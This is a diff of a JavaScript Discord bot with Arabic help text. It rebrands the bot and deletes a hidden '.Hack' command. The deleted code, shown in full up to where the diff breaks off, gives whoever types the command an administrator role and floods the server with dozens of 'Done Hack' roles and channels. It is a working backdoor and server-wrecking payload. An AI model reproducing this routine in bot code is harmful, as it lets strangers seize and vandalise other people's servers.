@@ -5,7 +5,7 @@ const dateFormat = require('dateformat');
 const fs = require('fs');
 var Canvas = require('canvas')
 var jimp = require('jimp')
-const prefix = "D";
+const prefix = "?";
 client.on('ready', () => {
     console.log('I am ready!');
 });
@@ -20,7 +20,7 @@ client.on('message', message => {
 
 
 client.on('ready', () => {                           
-client.user.setGame(`تم تهكيركم`,'https://www.twitch.tv/fofodiscord');                                                                                                                                                                                                                                                                                                                                                                                                                            
+client.user.setGame(`Kinges System/?help`,'https://www.twitch.tv/fofodiscord');                                                                                                                                                                                                                                                                                                                                                                                                                            
 });
 
 
@@ -269,37 +269,37 @@ ${prefix}queue ⇏ ♠لمعرفة قآئمة التشغيل❗
 
 
    client.on('message', message => {
-     if (message.content === "Dhelp") {
-message.author.send("DyzerYT-دايزر BOT" + `  **
+     if (message.content === "?help") {
+message.author.send("Kinges System Bot" + `  **
 
 =======================================
-❖-Dping📶         |يجيب لك سرعة اتصال البوت.
-❖-Dinfo👑      |لتشوف رتبة المحطوطة على الautorole.
-❖-Dautorole set😮    |ليعطي رتبة عند دخول على سيرفر اكتب الامر و اسم رتبة.
-❖-Dautorole toggle😀     |لتشغيل ولتوقيف ال autorole
-❖-Didℹ        |لتشوف الايدي حقك
-❖-Dinvite✅         |لدعوة البوت.
-❖-Dsay📚          |يكرر كلامك.
-❖-Dembed📑        |يكرر كلامك بطريقة اخرى.
-❖-Davatar📷       |يعرض لك صورتك.
-❖-Dcredit💱       |لتعرف رصيدك بلبوت.
-❖-Ddaily💳        |لتأخذ راتبك اليومي من البوت.
-❖-Dcredits        |لتعطي كريدت لصديقك
-❖-Dimage✨        |لتطليع صورت سيرفر.
-❖-Dsetchannel💣     |لأنشاء روم كتابي
-❖-Dsetvoice🔰       |لأنشاء روم صوتي.
-❖-Dmutechannel👑    |لعطي ميوت لروم.
-❖-Dunmutechannel〽  |لفك ميوت عن روم.
-❖-Dkick🎋      |لطرد شخص
-❖-Dban🎇       |لتبنيد شخص
-❖-Dunban🎆     |لفك باند عن الشخص.
-❖-Dclear📛     |لمسح الشات.
-❖-Daddrole😊   |لأنشاء رتبة.
-❖-Dbot⚠       |لتشوف معلومات البوت
-❖-Dserversbot💯   |لتشوف السيرفرات الموجود فيها البوت
-❖-Dbans🚩      |لتشوف الأشخاص المبندين.
-❖-Dbc😆          |خاصية البرودكاست.
-❖-Dmusic🎶     |أوامر الموسيقى.
+❖-?ping📶         |يجيب لك سرعة اتصال البوت.
+❖-?info👑      |لتشوف رتبة المحطوطة على الautorole.
+❖-?autorole set😮    |ليعطي رتبة عند دخول على سيرفر اكتب الامر و اسم رتبة.
+❖-?autorole toggle😀     |لتشغيل ولتوقيف ال autorole
+❖-?idℹ        |لتشوف الايدي حقك
+❖-?invite✅         |لدعوة البوت.
+❖-?say📚          |يكرر كلامك.
+❖-?embed📑        |يكرر كلامك بطريقة اخرى.
+❖-?avatar📷       |يعرض لك صورتك.
+❖-?credit💱       |لتعرف رصيدك بلبوت.
+❖-?daily💳        |لتأخذ راتبك اليومي من البوت.
+❖-?credits        |لتعطي كريدت لصديقك
+❖-?image✨        |لتطليع صورت سيرفر.
+❖-?setchannel💣     |لأنشاء روم كتابي
+❖-?setvoice🔰       |لأنشاء روم صوتي.
+❖-?mutechannel👑    |لعطي ميوت لروم.
+❖-?unmutechannel〽  |لفك ميوت عن روم.
+❖-?kick🎋      |لطرد شخص
+❖-?ban🎇       |لتبنيد شخص
+❖-?unban🎆     |لفك باند عن الشخص.
+❖-?clear📛     |لمسح الشات.
+❖-?addrole😊   |لأنشاء رتبة.
+❖-?bot⚠       |لتشوف معلومات البوت
+❖-?serversbot💯   |لتشوف السيرفرات الموجود فيها البوت
+❖-?bans🚩      |لتشوف الأشخاص المبندين.
+❖-?bc😆          |خاصية البرودكاست.
+❖-?music🎶     |أوامر الموسيقى.
 welcome = ساوي هذي الغرفة ليرحيب فيه
 leave = ليقلك الشخص الغادر السيرفر
 log = ساوي ذي غرفة لحماية السيرفر
@@ -391,13 +391,13 @@ client.on('ready', () => {
 
 
 client.on('message', message => {
-    if (message.content.startsWith("Dbot")) {
+    if (message.content.startsWith("?bot")) {
     message.channel.send({
         embed: new Discord.RichEmbed()
             .setAuthor(client.user.username,client.user.avatarURL)
             .setThumbnail(client.user.avatarURL)
             .setColor('RANDOM')
-            .setTitle('``INFO DyzerYT | دايزر`` ')
+            .setTitle('``Kinges System Bot`` ')
             .addField('``My Ping``' , [`${Date.now() - message.createdTimestamp}` + 'MS'], true)
             .addField('``servers``', [client.guilds.size], true)
             .addField('``channels``' , `[ ${client.channels.size} ]` , true)
@@ -436,11 +436,11 @@ client.on('message', message => {
 
 client.on('message', message => {
   if(!message.channel.guild) return;
-if(message.content.startsWith('Dbc')) {
+if(message.content.startsWith('?bc')) {
 if(!message.channel.guild) return message.channel.send('**هذا الأمر فقط للسيرفرات**').then(m => m.delete(5000));
 if(!message.member.hasPermission('ADMINISTRATOR')) return      message.channel.send('**للأسف لا تمتلك صلاحية** `ADMINISTRATOR`' );
 let args = message.content.split(" ").join(" ").slice(2 + prefix.length);
-let copy = "DyzerYT | دايزر";
+let copy = "Kinges System Bot";
 let request = `Requested By ${message.author.username}`;
 if (!args) return message.reply('**يجب عليك كتابة كلمة او جملة لإرسال البرودكاست**');message.channel.send(`**هل أنت متأكد من إرسالك البرودكاست؟ \nمحتوى البرودكاست:** \` ${args}\``).then(msg => {
 msg.react('✅')
@@ -516,7 +516,7 @@ client.on('message', message => {
 
 
   client.on("message", msg => {
-           var prefix = "D";
+           var prefix = "?";
   if(msg.content.startsWith (prefix + "id")) {
     if(!msg.channel.guild) return msg.reply('**:x: اسف لكن هذا الامر للسيرفرات فقط **');
       const embed = new Discord.RichEmbed();
@@ -566,7 +566,7 @@ channel.send({embed : embed});
 
 
 client.on("message", (message) => {
-if (message.content.startsWith("Dsetchannel")) {
+if (message.content.startsWith("?setchannel")) {
         let args = message.content.split(" ").slice(1);
     message.guild.createChannel(args.join(' '), 'text');
 message.channel.sendMessage('تـم إنـشاء روم كـتابي|✅')
@@ -579,7 +579,7 @@ message.channel.sendMessage('تـم إنـشاء روم كـتابي|✅')
 
 
 client.on("message", (message) => {
-if (message.content.startsWith("Dsetvoice")) {
+if (message.content.startsWith("?setvoice")) {
         let args = message.content.split(" ").slice(1);
     message.guild.createChannel(args.join(' '), 'voice');
     message.channel.sendMessage('تـم إنـشاء روم صوتي|✅')
@@ -760,7 +760,7 @@ let args = message.content.split(" ").slice(1);
 
 
   client.on('message', message => {
-    if (message.content.startsWith("Davatar")) {
+    if (message.content.startsWith("?avatar")) {
         var mentionned = message.mentions.users.first();
     var x5bzm;
       if(mentionned){
@@ -781,7 +781,7 @@ let args = message.content.split(" ").slice(1);
 
 
    client.on("message", message => {
-    const prefix = "D"
+    const prefix = "?"
 
           if(!message.channel.guild) return;
    if(message.author.bot) return;
@@ -882,7 +882,7 @@ client.on('message', message => {
 
 
 client.on('message', message => {
-    var prefix = "D"
+    var prefix = "?"
   if (message.author.x5bz) return;
   if (!message.content.startsWith(prefix)) return;
 
@@ -923,7 +923,7 @@ client.on('message', message => {
 
 	client.on('message', async message =>{
   if (message.author.boss) return;
-	var prefix = "D";
+	var prefix = "?";
 
 if (!message.content.startsWith(prefix)) return;
 	let command = message.content.split(" ")[0];
@@ -984,7 +984,7 @@ if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES")) return mess
 
 
 client.on('message' , message => {
-    var prefix = "D";
+    var prefix = "?";
     let user = message.mentions.users.first()|| client.users.get(message.content.split(' ')[1])
     if(message.content.startsWith(prefix + 'unban')) {
         if(!user) return  message.channel.send(`Do this ${prefix} <@ID user> \n or \n ${prefix}unban ID user`);
@@ -1007,7 +1007,7 @@ client.on('message' , message => {
     
     
 client.on('message', message => {
-if (message.content.startsWith("Daddrole")) {
+if (message.content.startsWith("?addrole")) {
              if(!message.channel.guild) return message.reply('**Commands in the server**');
         if (!message.member.hasPermission('MANAGE_ROLES')) return message.reply('⚠ **You do not have permissions**');
         let args = message.content.split(" ").slice(1);
@@ -1261,7 +1261,7 @@ client.on('guildMemberAdd', member => {
     .setTitle(`👑join Member👑`)
     .setDescription(`👋Welcome To Server👋`)
     .addField('You Number-أنت رقم',`**[ ${member.guild.memberCount} ]**`,true)
-    .addField('Dyzer_YT Bot')
+    .addField('Kinges System Bot')
     .setColor('RED')
 
 var channel =member.guild.channels.find('name', 'welcome')
@@ -1279,7 +1279,7 @@ channel.send({embed : embed});
 
 
   client.on('message', msg => {
-  if(msg.content === 'Dhelp')
+  if(msg.content === '?help')
   msg.reply('تم الأرسال بلخاص|✅')
 });
 
@@ -1288,1429 +1288,12 @@ channel.send({embed : embed});
 
 
 
-var x_x = ".Hack" //هنا تحط الامر اللي يشغل الهاك
 
-//اسم البوت واسم السيرفر وصورهم وكل شئ
 
 
 
-//اللي يسوي رتب
 
-client.on('message', message => {
- if (!message.channel.guild) return;
 
- if (message.content === x_x) {
-  if (!message.channel.guild) return;
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [8],
-   color: "#23272a"
-  }).then(function(role) {
-   message.member.addRole(role);
-  })
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: " #23272a"
-  });
-  message.guild.createRole({
-   name: "Done Hack ",
-   permissions: [1],
-   color: "#ff0000"
-  });
-
-
- }
-});
-
-
-//هنا اللي يسوي الرومات
-client.on('message', message => {
- if (message.content === x_x) {
-  if (!message.channel.guild) return;
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-
-
- }
-
-});
-client.on('message', message => {
- if (message.content === x_x) {
-  if (!message.channel.guild) return;
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-
-
- }
-
-});
-client.on('message', message => {
- if (message.content === x_x) {
-  if (!message.channel.guild) return;
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
